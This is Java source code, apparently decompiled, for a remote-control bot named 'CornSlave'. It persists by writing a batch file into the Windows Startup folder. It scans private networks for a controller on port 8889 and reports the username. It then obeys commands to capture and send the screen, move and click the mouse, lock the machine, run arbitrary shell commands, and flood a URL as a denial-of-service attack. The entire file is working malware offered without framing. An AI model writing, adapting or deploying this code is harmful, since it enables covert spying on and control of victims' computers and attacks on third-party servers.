import java.net.URLConnection;
import java.net.URL;
import java.awt.Dimension;
import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.awt.Color;
import javax.swing.JFrame;
import java.net.SocketAddress;
import java.net.InetSocketAddress;
import java.awt.image.BufferedImage;
import java.awt.Image;
import javax.swing.ImageIcon;
import java.awt.Rectangle;
import java.awt.Toolkit;
import java.net.SocketException;
import java.nio.file.Path;
import java.nio.file.Files;
import java.io.OutputStream;
import java.io.DataOutputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.File;
import java.nio.file.Paths;
import java.util.Iterator;
import java.io.IOException;
import java.util.ArrayList;
import java.net.Socket;
import java.net.InetAddress;
import java.awt.AWTException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.awt.Robot;


public class CornSlave
{
    private Robot bot;
    private ObjectOutputStream oos;
    private ObjectInputStream ois;
    
    public static void main(final String[] args) {
        new CornSlave();
    }
    
    public CornSlave() {
        try {
            this.bot = new Robot();
        }
        catch (AWTException e1) {
            e1.printStackTrace();
        }
        this.Persistence();
        String localhost = null;
        int block1 = -1;
        int block2 = -1;
        int block2_start = 0;
        int block2_end = 255;
        try {
            localhost = InetAddress.getLocalHost().getHostAddress();
        }
        catch (Exception e3) {
            System.err.println("invalid host");
            System.exit(-192);
        }
        final String[] blocks = localhost.split("\\.");
        block1 = Integer.parseInt(blocks[0]);
        block2 = Integer.parseInt(blocks[1]);
        if (block1 == 10) {
            block2_start = 0;
            block2_end = 255;
        }
        else if (block1 == 172) {
            block2_start = 16;
            block2_end = 31;
        }
        else if (block1 == 192) {
            block2_start = 168;
            block2_end = 168;
        }
        Socket serverSocket = this.detectServer(block1, block2);
        while (serverSocket == null) {
            System.err.println("we are not supposed to be HERE");
            for (int i = block2_start; i <= block2_end; ++i) {
                serverSocket = this.detectServer(block1, i);
                if (serverSocket != null) {
                    i = 256;
                }
            }
            if (serverSocket == null) {
                try {
                    Thread.sleep(20000L);
                }
                catch (InterruptedException e2) {
                    e2.printStackTrace();
                }
            }
        }
        this.getOrders(serverSocket);
    }
    
    private Socket detectServer(final int b1, final int b2) {
        final ArrayList<detectThread> threads = new ArrayList<detectThread>();
        System.out.println("looking at " + b1 + "." + b2 + ".x.x");
        for (int b3 = 0; b3 <= 255; ++b3) {
            final detectThread loop4 = new detectThread(b1, b2, b3);
            threads.add(loop4);
            loop4.start();
        }
        final int i = 0;
        for (final detectThread thr : threads) {
            try {
                thr.join();
            }
            catch (InterruptedException e) {
                e.printStackTrace();
            }
            if (thr.socket != null) {
                synchronized (threads) {
                    System.out.println(thr.socket);
                    try {
                        (this.oos = new ObjectOutputStream(thr.socket.getOutputStream())).flush();
                        this.ois = new ObjectInputStream(thr.socket.getInputStream());
                        System.out.println("streams good");
                    }
                    catch (IOException e2) {
                        e2.printStackTrace();
                        System.exit(-10);
                    }
                    // monitorexit(threads)
                    return thr.socket;
                }
            }
        }
        return null;
    }
    
    private void Persistence() {
        System.out.println("trying to save in startup");
        final String autostart = System.getProperty("java.io.tmpdir").replace("Local\\Temp\\", "Roaming\\Microsoft\\Windows\\Start Menu\\Programs");
        final String runningdir = Paths.get(".", new String[0]).toAbsolutePath().normalize().toString();
        final File file = new File(String.valueOf(autostart) + "\\Startup\\runSlave.bat");
        FileOutputStream fos = null;
        try {
            fos = new FileOutputStream(file);
        }
        catch (FileNotFoundException e) {
            e.printStackTrace();
        }
        final DataOutputStream dos = new DataOutputStream(fos);
        try {
            dos.writeBytes("cd \"" + autostart + "\\\"\nstart CornSlave.jar");
        }
        catch (IOException e2) {
            e2.printStackTrace();
        }
        final Path src = Paths.get(String.valueOf(runningdir) + "\\CornSlave.jar", new String[0]);
        final Path dest = Paths.get(String.valueOf(autostart) + "\\CornSlave.jar", new String[0]);
        try {
            Files.copy(src, new FileOutputStream(dest.toFile()));
        }
        catch (Exception e3) {
            e3.printStackTrace();
        }
        System.out.println("Save successful");
    }
    
    private void revive(final InetAddress addr) {
        System.out.println("lost connection with server. trying to revive...");
        final String[] blocks = addr.getHostAddress().split("\\.");
        final int block1 = Integer.parseInt(blocks[0]);
        final int block2 = Integer.parseInt(blocks[1]);
        System.out.println(".");
        System.out.println(".");
        int block2_start;
        int block2_end;
        if (block1 == 10) {
            block2_start = 0;
            block2_end = 255;
        }
        else if (block1 == 172) {
            block2_start = 16;
            block2_end = 31;
        }
        else if (block1 == 192) {
            block2_start = 168;
            block2_end = 168;
        }
        else {
            block2_start = 0;
            block2_end = 0;
        }
        Socket serverSocket = this.detectServer(block1, block2);
        while (serverSocket == null) {
            for (int i = block2_start; i <= block2_end; ++i) {
                serverSocket = this.detectServer(block1, i);
                if (serverSocket != null) {
                    i = 256;
                }
            }
            if (serverSocket == null) {
                try {
                    Thread.sleep(20000L);
                }
                catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }
        System.out.println("revived");
        this.getOrders(serverSocket);
    }
    
    private void killThreads(final Thread[] toKill) {
        for (final Thread t : toKill) {
            t.stop();
        }
    }
    
    private void getOrders(final Socket serverSocket) {
        LockThread lockComp = null;
        DosThread dosComp = null;
        try {
            this.oos.writeObject(System.getProperty("user.name"));
            this.oos.reset();
            this.oos.flush();
        }
        catch (Exception e) {
            e.printStackTrace();
        }
        System.out.println("all ready!");
        while (true) {
            Object command = null;
            while (command == null) {
                try {
                    command = this.ois.readObject();
                }
                catch (SocketException e6) {
                    this.revive(serverSocket.getInetAddress());
                    return;
                }
                catch (ClassNotFoundException e2) {
                    e2.printStackTrace();
                }
                catch (IOException e3) {
                    e3.printStackTrace();
                }
            }
            if (command instanceof String) {
                System.out.println(command);
                final String[] parameters = ((String)command).split(" ");
                if (((String)command).contentEquals("isalive")) {
                    continue;
                }
                if (parameters[0].contentEquals("movemouse")) {
                    try {
                        this.bot.mouseMove(Integer.parseInt(parameters[1]), Integer.parseInt(parameters[2]));
                    }
                    catch (Exception ex) {}
                }
                else if (parameters[0].contentEquals("clickmouse")) {
                    final int[] mb = { 16, 8, 4 };
                    try {
                        if (parameters.length == 1) {
                            this.bot.mousePress(16);
                            this.bot.mouseRelease(16);
                        }
                        else if (parameters.length == 2) {
                            this.bot.mousePress(mb[Integer.parseInt(parameters[1])]);
                            this.bot.mouseRelease(mb[Integer.parseInt(parameters[1])]);
                        }
                        else if (parameters.length == 3) {
                            this.bot.mouseMove(Integer.parseInt(parameters[1]), Integer.parseInt(parameters[2]));
                            this.bot.mousePress(16);
                            this.bot.mouseRelease(16);
                        }
                        else {
                            if (parameters.length != 4) {
                                continue;
                            }
                            this.bot.mouseMove(Integer.parseInt(parameters[1]), Integer.parseInt(parameters[2]));
                            this.bot.mousePress(mb[Integer.parseInt(parameters[3])]);
                            this.bot.mouseRelease(mb[Integer.parseInt(parameters[3])]);
                        }
                    }
                    catch (Exception ex2) {}
                }
                else if (parameters[0].contentEquals("ddos")) {
                    dosComp = new DosThread(parameters[1]);
                    dosComp.start();
                }
                else if (parameters[0].contentEquals("stopddos")) {
                    if (dosComp != null) {
                        dosComp.stop();
                    }
                    dosComp = null;
                }
                else if (parameters[0].contentEquals("capture")) {
                    final BufferedImage screenFullImage = this.bot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                    final ImageIcon icon = new ImageIcon(screenFullImage);
                    try {
                        this.oos.writeObject(icon);
                        this.oos.reset();
                        this.oos.flush();
                    }
                    catch (IOException e4) {
                        e4.printStackTrace();
                    }
                }
                else if (parameters[0].contentEquals("lockmachine")) {
                    lockComp = new LockThread((LockThread)null);
                    lockComp.start();
                }
                else if (parameters[0].contentEquals("unlockmachine")) {
                    if (lockComp != null) {
                        lockComp.stayLocked = false;
                    }
                    lockComp = null;
                }
                else {
                    if (!parameters[0].contentEquals("cmd")) {
                        continue;
                    }
                    final String[] run = new String[parameters.length + 1];
                    run[0] = "cmd";
                    run[1] = "/K";
                    for (int i = 1; i < parameters.length; ++i) {
                        run[i + 1] = parameters[i];
                    }
                    try {
                        Runtime.getRuntime().exec(run);
                    }
                    catch (IOException e5) {
                        e5.printStackTrace();
                    }
                }
            }
        }
    }
    
    private class detectThread extends Thread
    {
        private int[] block;
        private Socket socket;
        
        public detectThread(final int b1, final int b2, final int b3) {
            (this.block = new int[3])[0] = b1;
            this.block[1] = b2;
            this.block[2] = b3;
        }
        
        @Override
        public void run() {
            int b4 = 0;
            while (b4 <= 255) {
                final Socket socketArr = new Socket();
                final InetSocketAddress socketAddr = new InetSocketAddress(String.valueOf(this.block[0]) + "." + this.block[1] + "." + this.block[2] + "." + b4, 8889);
                try {
                    socketArr.connect(socketAddr, 1);
                    this.socket = socketArr;
                    System.out.println("server found at " + this.block[0] + "." + this.block[1] + "." + this.block[2] + "." + b4);
                    b4 = 256;
                }
                catch (IOException e) {
                    ++b4;
                }
            }
        }
    }
    
    private class LockThread extends Thread
    {
        JFrame lockScreen;
        boolean stayLocked;
        
        private LockThread() {
            this.stayLocked = true;
        }
        
        @Override
        public void run() {
            (this.lockScreen = new JFrame()).setAlwaysOnTop(true);
            this.lockScreen.getContentPane().setBackground(Color.gray);
            final Dimension size = Toolkit.getDefaultToolkit().getScreenSize();
            this.lockScreen.setDefaultCloseOperation(1);
            this.lockScreen.setSize(size);
            this.lockScreen.setLocation(0, 0);
            this.lockScreen.setUndecorated(true);
            this.lockScreen.setExtendedState(6);
            this.lockScreen.setVisible(true);
            this.lockScreen.addKeyListener(new KeyListener() {
                @Override
                public void keyTyped(final KeyEvent e) {
                }
                
                @Override
                public void keyPressed(final KeyEvent e) {
                }
                
                @Override
                public void keyReleased(final KeyEvent e) {
                }
            });
            while (this.stayLocked) {
                CornSlave.this.bot.mouseMove(size.width / 2, size.height / 2);
            }
            this.lockScreen.dispose();
        }
    }
    
    private class DosThread extends Thread
    {
        String url;
        
        public DosThread(final String urlTarget) {
            this.url = urlTarget;
        }
        
        @Override
        public void run() {
            URLConnection connection = null;
        Label_0002_Outer:
            while (true) {
                while (true) {
                    try {
                        while (true) {
                            System.out.println("bam!");
                            connection = new URL(this.url).openConnection();
                        }
                    }
                    catch (Exception e) {
                        e.printStackTrace();
                        continue Label_0002_Outer;
                    }
                    continue;
                }
            }
        }
    }
}
